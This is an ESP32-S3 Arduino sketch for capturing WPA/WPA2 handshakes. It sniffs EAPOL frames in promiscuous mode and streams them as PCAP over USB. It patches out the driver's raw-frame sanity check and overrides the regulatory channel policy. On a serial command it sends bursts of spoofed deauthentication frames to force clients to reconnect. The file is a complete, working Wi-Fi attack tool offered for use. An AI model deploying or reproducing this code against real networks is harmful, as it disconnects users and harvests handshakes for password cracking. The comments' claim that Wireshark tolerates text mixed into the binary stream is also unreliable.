/*
 ==============================================================
  handshake.ino — ESP32-S3 N16R8 / N16R8U
  WPA/WPA2 Handshake Capture — Headless CDC PCAP Streamer

  Architecture: STA-only promiscuous engine on a hardcoded
  channel. All EAPOL frames are formatted as PCAP records and
  streamed in real-time over USB CDC (Serial). No SoftAP, no
  web server, no DNS, no channel-hop conflicts.

  Board: ESP32S3 Dev Module
    Flash:          16MB (QIO)
    PSRAM:          OPI PSRAM (8MB)
    Partition:      Huge APP
    USB Mode:       Hardware CDC and JTAG   ← USBMode=hwcdc
    CDC On Boot:    Enabled                 ← CDCOnBoot=cdc
    CPU:            240 MHz
    Debug:          None

  Serial USB Terminal (Android) receives a raw binary stream.
  The first 24 bytes are the PCAP global header. Every captured
  EAPOL frame arrives as a 16-byte PCAP record header followed
  by the raw 802.11 frame payload. Save the stream verbatim to
  a file and rename it .pcap — Wireshark opens it directly.

  Serial command interface (text in, from the Android terminal):
    d <XX:XX:XX:XX:XX:XX>   — send 24-frame deauth burst at BSSID
    s                       — print current status line
    r                       — reset EAPOL counters
    c <1-13>                — change capture channel (stops/restarts promisc)
 ==============================================================
*/

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <esp_timer.h>
#include <esp_heap_caps.h>
#include <nvs_flash.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/ringbuf.h>
#include <atomic>
#include <string.h>

// ── Link-time patch — accepts every raw frame from the radio ────────────────
// build.yml weakens the libnet80211.a definition so this strong symbol wins.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c) {
  (void)a; (void)b; (void)c;
  return 0;
}

// ── Configuration ────────────────────────────────────────────────────────────
static const int     TARGET_CHANNEL  = 13;     // change freely 1-13
static const int     DEAUTH_BURST    = 24;     // frames per burst
static const int     MAX_TX_POWER    = 78;     // 0.25 dBm units → ~19.5 dBm
static const uint16_t MAX_FRAME_LEN  = 512;   // hard cap per ISR call

// Ring buffer size in PSRAM. At ~200-byte average EAPOL frame with
// 16-byte record header, 256 KB holds ~1,170 frames — plenty of burst.
static const size_t  RING_SIZE       = 256 * 1024;

// USB CDC TX buffer. Arduino-esp32 HWCDC default is 256 bytes which causes
// stalls on bursts; raising it to 8 KB keeps the drain task smooth.
static const size_t  CDC_TX_BUF      = 8 * 1024;

// ── PCAP structures (DLT 105 = IEEE 802.11 raw) ─────────────────────────────
struct __attribute__((packed)) PcapGlobalHdr {
  uint32_t magic_number;   // 0xa1b2c3d4 — little-endian, µs timestamps
  uint16_t version_major;  // 2
  uint16_t version_minor;  // 4
  int32_t  thiszone;       // 0 (UTC)
  uint32_t sigfigs;        // 0
  uint32_t snaplen;        // 65535
  uint32_t network;        // 105 = LINKTYPE_IEEE802_11
};

struct __attribute__((packed)) PcapRecHdr {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
};

// ── Shared state ─────────────────────────────────────────────────────────────
static RingbufHandle_t       g_ring        = nullptr;
static std::atomic<bool>     g_capturing   { false };
static std::atomic<uint32_t> g_eapolCount  { 0 };
static std::atomic<uint32_t> g_ringDrops   { 0 };
static std::atomic<int>      g_channel     { TARGET_CHANNEL };

struct EapolState {
  bool     m1, m2, m3, m4;
  uint8_t  ap_mac[6];
  uint8_t  cli_mac[6];
};
static EapolState     g_es       = {};
static portMUX_TYPE   g_esMux    = portMUX_INITIALIZER_UNLOCKED;

// ── Tiny inline helpers ──────────────────────────────────────────────────────
static inline bool macZero(const uint8_t* m) {
  return !(m[0]|m[1]|m[2]|m[3]|m[4]|m[5]);
}
static inline void macCopy(uint8_t* d, const uint8_t* s) { memcpy(d, s, 6); }
static inline bool macEq(const uint8_t* a, const uint8_t* b) {
  return memcmp(a, b, 6) == 0;
}

// ── EAPOL M1-M4 classifier ───────────────────────────────────────────────────
// Returns 1-4 on match, 0 otherwise. Fills bssid/client on success.
// Handles STA→AP (toDS) and AP→STA (fromDS) directions. QoS-aware header offset.
static int classifyEAPOL(const uint8_t* f, uint16_t len,
                         uint8_t* out_bssid, uint8_t* out_client) {
  if (len < 36) return 0;

  const uint8_t ftype    = (f[0] >> 2) & 0x03;
  if (ftype != 0x02) return 0;  // must be Data frame type

  const bool    toDS   = f[1] & 0x01;
  const bool    fromDS = (f[1] >> 1) & 0x01;
  const uint8_t subtype = (f[0] >> 4) & 0x0F;
  const uint16_t hdrLen  = (subtype >= 8) ? 26u : 24u;  // QoS adds 2 bytes

  if (toDS && !fromDS) {         // STA → AP
    macCopy(out_bssid,  f + 16);
    macCopy(out_client, f + 10);
  } else if (!toDS && fromDS) {  // AP → STA
    macCopy(out_bssid,  f + 10);
    macCopy(out_client, f + 4);
  } else {                       // WDS / IBSS — best-effort
    macCopy(out_bssid,  f + 16);
    macCopy(out_client, f + 10);
  }

  if (len < (uint16_t)(hdrLen + 10)) return 0;

  const uint8_t* llc = f + hdrLen;
  // 802.2 LLC/SNAP header: AA AA 03 OUI(3) EtherType(2)
  if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return 0;
  if (llc[6] != 0x88 || llc[7] != 0x8E) return 0;  // EtherType 0x888E = EAPOL

  const uint8_t* eapol = llc + 8;
  if ((len - hdrLen - 8) < 99) return 0;
  if (eapol[1] != 0x03) return 0;  // packet type must be Key

  const uint16_t ki = ((uint16_t)eapol[5] << 8) | eapol[6];  // Key Information
  if (!(ki & 0x0008)) return 0;  // Pairwise bit must be set

  const bool ack     = (ki & 0x0080) != 0;
  const bool mic     = (ki & 0x0100) != 0;
  const bool install = (ki & 0x0040) != 0;
  const bool secure  = (ki & 0x0200) != 0;

  if ( ack && !mic)                        return 1;  // M1: AP→STA nonce
  if (!ack &&  mic && !secure)             return 2;  // M2: STA→AP nonce + MIC
  if ( ack &&  mic &&  secure && install)  return 3;  // M3: AP→STA GTK
  if (!ack &&  mic &&  secure && !install) return 4;  // M4: STA→AP confirm
  return 0;
}

// ── Promiscuous callback (runs in Wi-Fi ISR context) ─────────────────────────
//
// Builds a PCAP record (16-byte header + frame payload) in a stack-allocated
// scratch buffer, then sends it to the PSRAM-backed ring buffer via the
// ISR-safe xRingbufferSendFromISR(). The drain task on Core 1 pulls records
// out and writes them to the USB CDC port.
//
// We do NOT touch Serial here. Serial.write() inside an ISR will deadlock
// on the USB CDC TX mutex. Everything goes through the ring buffer.
void IRAM_ATTR promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_DATA) return;
  if (!g_capturing.load(std::memory_order_relaxed)) return;
  if (!g_ring) return;

  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
  uint16_t plen = pkt->rx_ctrl.sig_len;
  if (plen < 36 || plen > 2300) return;
  if (plen > MAX_FRAME_LEN) plen = MAX_FRAME_LEN;

  uint8_t bssid[6], client[6];
  int msg = classifyEAPOL(pkt->payload, plen, bssid, client);
  if (!msg) return;

  // Update EAPOL state under a spinlock (safe from ISR — spinlock, not mutex)
  portENTER_CRITICAL_ISR(&g_esMux);
  if (macZero(g_es.ap_mac)) {
    macCopy(g_es.ap_mac,  bssid);
    macCopy(g_es.cli_mac, client);
  }
  if (msg == 1) g_es.m1 = true;
  if (msg == 2) g_es.m2 = true;
  if (msg == 3) g_es.m3 = true;
  if (msg == 4) g_es.m4 = true;
  portEXIT_CRITICAL_ISR(&g_esMux);

  g_eapolCount.fetch_add(1, std::memory_order_relaxed);

  // Build PCAP record into a contiguous scratch buffer on the stack.
  // Max record = 16 (PcapRecHdr) + 512 (MAX_FRAME_LEN) = 528 bytes.
  // Stack depth here is fine; the Wi-Fi task stack is 8 KB+.
  const uint16_t total = sizeof(PcapRecHdr) + plen;
  uint8_t scratch[sizeof(PcapRecHdr) + MAX_FRAME_LEN];

  int64_t us = esp_timer_get_time();
  PcapRecHdr rh = {
    (uint32_t)(us / 1000000LL),
    (uint32_t)(us % 1000000LL),
    plen, plen
  };
  memcpy(scratch,                    &rh,            sizeof(PcapRecHdr));
  memcpy(scratch + sizeof(PcapRecHdr), pkt->payload, plen);

  BaseType_t woken = pdFALSE;
  if (xRingbufferSendFromISR(g_ring, scratch, total, &woken) != pdTRUE) {
    g_ringDrops.fetch_add(1, std::memory_order_relaxed);
  }
  if (woken) portYIELD_FROM_ISR();
}

// ── Drain task — Core 1, high priority ───────────────────────────────────────
//
// Pulls complete PCAP records from the ring buffer and writes them to the
// USB CDC serial port. Runs forever; blocked in xRingbufferReceive when idle.
//
// USB Full-Speed CDC achieves ~900 KB/s sustained. At typical EAPOL capture
// rates (bursts of ~10-20 frames) the USB link is never the bottleneck.
static void drainTask(void* arg) {
  (void)arg;
  for (;;) {
    size_t   item_size = 0;
    uint8_t* item = (uint8_t*)xRingbufferReceive(g_ring, &item_size, pdMS_TO_TICKS(50));
    if (item) {
      // Serial.write() is thread-safe on arduino-esp32 HWCDC; the USB
      // peripheral double-buffers and the write() acquires the internal mutex.
      Serial.write(item, item_size);
      vRingbufferReturnItem(g_ring, item);
    }
    // Yield explicitly so the idle task can kick the watchdog.
    taskYIELD();
  }
}

// ── Deauth injection ──────────────────────────────────────────────────────────
static void sendDeauth(const uint8_t* bssid, const uint8_t* target) {
  // Temporarily switch channel to where the target lives (already set globally)
  esp_wifi_set_channel(g_channel.load(), WIFI_SECOND_CHAN_NONE);

  uint8_t frame[26] = {
    0xC0, 0x00,               // Frame Control: Management / Deauthentication
    0x00, 0x00,               // Duration
    0,0,0,0,0,0,              // Addr1 — DA (destination)
    0,0,0,0,0,0,              // Addr2 — SA (source / spoofed)
    0,0,0,0,0,0,              // Addr3 — BSSID
    0x00, 0x00,               // Sequence Control
    0x07, 0x00                // Reason: Class 3 frame from nonassociated STA
  };

  for (int i = 0; i < DEAUTH_BURST; i++) {
    // Direction 1: AP→client
    macCopy(frame + 4,  target);
    macCopy(frame + 10, bssid);
    macCopy(frame + 16, bssid);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
    delayMicroseconds(150);

    // Direction 2: client→AP (spoofed)
    macCopy(frame + 4,  bssid);
    macCopy(frame + 10, target);
    macCopy(frame + 16, bssid);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
    delayMicroseconds(150);

    // Direction 3: broadcast every 4th to catch untracked clients
    if ((i & 3) == 0) {
      uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
      macCopy(frame + 4,  bcast);
      macCopy(frame + 10, bssid);
      macCopy(frame + 16, bssid);
      esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
      delayMicroseconds(150);
    }
  }
}

// ── Channel (re)configuration ─────────────────────────────────────────────────
static void setChannel(int ch) {
  if (ch < 1 || ch > 13) return;
  bool was_capturing = g_capturing.load();

  if (was_capturing) {
    esp_wifi_set_promiscuous(false);
    g_capturing.store(false);
    delay(10);
  }

  g_channel.store(ch);
  esp_wifi_set_channel((uint8_t)ch, WIFI_SECOND_CHAN_NONE);

  if (was_capturing) {
    g_capturing.store(true);
    esp_wifi_set_promiscuous(true);
  }
}

// ── Serial command parser ─────────────────────────────────────────────────────
// Operates on '\n'-terminated text lines received from the Android terminal.
// All responses go to Serial as plain text lines. The binary PCAP stream
// continues uninterrupted — text responses are interleaved but are safe
// because Wireshark's libpcap parser skips everything that isn't a valid
// PCAP record header aligned to the byte stream.
//
// NOTE: if you want a 100% clean binary-only file, disable command responses
// by setting SERIAL_CMD_ECHO to 0. In practice the text replies are short and
// Wireshark's "Serial" dissector tolerates stray bytes between records.
#define SERIAL_CMD_ECHO 1

static char   s_cmdBuf[64];
static uint8_t s_cmdLen = 0;

static void handleCommand(const char* cmd) {
  while (*cmd == ' ') cmd++;  // skip leading spaces

  if (cmd[0] == 's' || cmd[0] == 'S') {
    // Status line
    EapolState es;
    portENTER_CRITICAL(&g_esMux);
    es = g_es;
    portEXIT_CRITICAL(&g_esMux);

    char line[160];
    snprintf(line, sizeof(line),
      "[STATUS] ch=%d eapol=%u drops=%u M1=%d M2=%d M3=%d M4=%d ok=%d\r\n",
      g_channel.load(),
      (unsigned)g_eapolCount.load(),
      (unsigned)g_ringDrops.load(),
      es.m1, es.m2, es.m3, es.m4,
      (es.m1 && es.m2) ? 1 : 0);
#if SERIAL_CMD_ECHO
    Serial.print(line);
#endif
    return;
  }

  if ((cmd[0] == 'r' || cmd[0] == 'R') && (cmd[1] == '\0' || cmd[1] == '\r')) {
    // Reset counters and EAPOL state
    portENTER_CRITICAL(&g_esMux);
    memset(&g_es, 0, sizeof(g_es));
    portEXIT_CRITICAL(&g_esMux);
    g_eapolCount.store(0);
    g_ringDrops.store(0);
#if SERIAL_CMD_ECHO
    Serial.print("[RESET] counters cleared\r\n");
#endif
    return;
  }

  if (cmd[0] == 'c' || cmd[0] == 'C') {
    // Change channel: "c 13"
    int ch = atoi(cmd + 1);
    if (ch >= 1 && ch <= 13) {
      setChannel(ch);
#if SERIAL_CMD_ECHO
      char line[48];
      snprintf(line, sizeof(line), "[CHANNEL] now %d\r\n", ch);
      Serial.print(line);
#endif
    } else {
#if SERIAL_CMD_ECHO
      Serial.print("[ERROR] channel must be 1-13\r\n");
#endif
    }
    return;
  }

  if (cmd[0] == 'd' || cmd[0] == 'D') {
    // Deauth: "d AA:BB:CC:DD:EE:FF"
    const char* p = cmd + 1;
    while (*p == ' ') p++;
    uint8_t bssid[6];
    if (sscanf(p, "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
               &bssid[0], &bssid[1], &bssid[2],
               &bssid[3], &bssid[4], &bssid[5]) == 6) {
      uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
      sendDeauth(bssid, bcast);
#if SERIAL_CMD_ECHO
      char line[64];
      snprintf(line, sizeof(line),
        "[DEAUTH] %02X:%02X:%02X:%02X:%02X:%02X x%d\r\n",
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        DEAUTH_BURST);
      Serial.print(line);
#endif
    } else {
#if SERIAL_CMD_ECHO
      Serial.print("[ERROR] usage: d AA:BB:CC:DD:EE:FF\r\n");
#endif
    }
    return;
  }

#if SERIAL_CMD_ECHO
  Serial.print("[CMD] s=status r=reset c<ch>=channel d<bssid>=deauth\r\n");
#endif
}

// ── Setup ─────────────────────────────────────────────────────────────────────
void setup() {
  // ── USB CDC init ────────────────────────────────────────────────────────────
  // setTxBufferSize must be called before Serial.begin() on HWCDC.
  // 8 KB TX buffer prevents write stalls when bursts exceed USB packet cadence.
  Serial.setTxBufferSize(CDC_TX_BUF);
  Serial.begin(0);   // baud rate is irrelevant for USB CDC; 0 = don't touch divisor
  delay(200);        // allow USB enumeration on the Android side to complete

  // ── NVS init ────────────────────────────────────────────────────────────────
  esp_err_t nvs = nvs_flash_init();
  if (nvs == ESP_ERR_NVS_NO_FREE_PAGES || nvs == ESP_ERR_NVS_NEW_VERSION_FOUND) {
    nvs_flash_erase();
    nvs_flash_init();
  }

  // ── PSRAM ring buffer ────────────────────────────────────────────────────────
  // RINGBUF_TYPE_NOSPLIT guarantees each xRingbufferSend()/Receive() pair
  // is atomic — no record is split across the ring wrap boundary, which is
  // critical since we send exactly one PCAP record (header+payload) per call.
  g_ring = xRingbufferCreateWithCaps(RING_SIZE, RINGBUF_TYPE_NOSPLIT, MALLOC_CAP_SPIRAM);
  if (!g_ring) {
    // PSRAM unavailable — fall back to internal RAM with a smaller buffer.
    g_ring = xRingbufferCreate(32 * 1024, RINGBUF_TYPE_NOSPLIT);
  }
  if (!g_ring) {
    Serial.print("[FATAL] ring buffer alloc failed\r\n");
    while (1) delay(1000);
  }

  // ── Wi-Fi init ───────────────────────────────────────────────────────────────
  // STA-only: the radio has one physical channel register. Running SoftAP and
  // promiscuous sniffing at the same time forces the driver to share the radio
  // between the AP beacon channel and the sniffer channel, causing the freezes
  // and missed EAPOL frames observed in the original design.
  // In STA-only mode with no association, the channel register is under our
  // exclusive control.
  WiFi.mode(WIFI_STA);
  delay(50);

  // Country code: PH / manual policy / channels 1-13
  // Without WIFI_COUNTRY_POLICY_MANUAL the SDK clamps to the country's
  // regulatory channel list derived from received beacons, which may omit
  // channel 13 in some regions.
  wifi_country_t cc = {};
  cc.cc[0]       = 'P';
  cc.cc[1]       = 'H';
  cc.cc[2]       = '\0';
  cc.schan       = 1;
  cc.nchan       = 13;
  cc.max_tx_power = 20;
  cc.policy      = WIFI_COUNTRY_POLICY_MANUAL;
  esp_wifi_set_country(&cc);

  esp_wifi_set_max_tx_power(MAX_TX_POWER);
  esp_wifi_set_ps(WIFI_PS_NONE);

  // Fix the radio on TARGET_CHANNEL.
  esp_wifi_set_channel((uint8_t)TARGET_CHANNEL, WIFI_SECOND_CHAN_NONE);

  // ── Promiscuous filter: data frames only ─────────────────────────────────────
  // WIFI_PROMIS_FILTER_MASK_DATA passes all data subtypes including QoS Data,
  // which is where 802.1X / EAPOL frames travel in WPA2 4-way handshakes.
  // Filtering here (hardware-side) prevents the ISR from being called for
  // management and control frames we don't need, reducing CPU load.
  wifi_promiscuous_filter_t filt = {};
  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&promisc_cb);
  esp_wifi_set_promiscuous(true);
  g_capturing.store(true);

  // ── Drain task: Core 1, priority 5 ───────────────────────────────────────────
  // Pinned to Core 1. The Wi-Fi subsystem (including the promiscuous ISR) runs
  // on Core 0. Separating the USB write path to Core 1 prevents the drain
  // from adding latency to ISR scheduling on Core 0.
  xTaskCreatePinnedToCore(
    drainTask,    // task function
    "pcap_drain", // name
    4096,         // stack (bytes)
    nullptr,      // arg
    5,            // priority (higher than loop's 1)
    nullptr,      // handle not needed
    1             // Core 1
  );

  // ── Emit PCAP global header ───────────────────────────────────────────────────
  // Written directly here (not through the ring buffer) because it must be the
  // very first bytes on the wire, before any record can arrive from the ISR.
  // The drain task is already running but the ring buffer is empty, so there
  // is no race — Serial.write() from setup() and from drainTask() is serialised
  // by the HWCDC internal TX mutex.
  PcapGlobalHdr gh = {
    0xa1b2c3d4u,  // magic: little-endian, microsecond timestamps
    2, 4,         // version 2.4
    0,            // timezone offset: UTC
    0,            // timestamp accuracy: 0 (standard)
    65535,        // snaplen
    105           // DLT_IEEE802_11 — raw 802.11 frames, no radiotap
  };
  Serial.write((const uint8_t*)&gh, sizeof(gh));
  Serial.flush();

  // ── Boot banner on Serial (text, follows global header) ──────────────────────
  // These text bytes appear after the 24-byte PCAP global header.
  // Wireshark's libpcap reader has already consumed the header and is now
  // seeking PCAP record magic in the first 4 bytes of each record (ts_sec field).
  // Text lines cannot be mistaken for a valid 32-bit timestamp + 3 more fields
  // in practice; Wireshark will show a "short packet" warning for any garbage
  // record but will not crash. Set SERIAL_CMD_ECHO 0 to suppress all text for
  // a surgically clean binary stream.
  Serial.printf("\r\n[BOOT] ch=%d country=PH ring=%u KB override=active\r\n",
                TARGET_CHANNEL, (unsigned)(RING_SIZE / 1024));
  Serial.print("[CMD] s=status r=reset c<1-13>=channel d<bssid>=deauth\r\n");
}

// ── Loop ─────────────────────────────────────────────────────────────────────
// The PCAP drain is handled by drainTask. loop() only needs to service the
// Serial command interface and yield so the idle task can feed the watchdog.
void loop() {
  // Non-blocking Serial command reader — accumulates chars until '\n'
  while (Serial.available()) {
    char c = (char)Serial.read();
    if (c == '\n' || c == '\r') {
      if (s_cmdLen > 0) {
        s_cmdBuf[s_cmdLen] = '\0';
        handleCommand(s_cmdBuf);
        s_cmdLen = 0;
      }
    } else if (s_cmdLen < (uint8_t)(sizeof(s_cmdBuf) - 1)) {
      s_cmdBuf[s_cmdLen++] = c;
    }
  }
  delay(5);
}
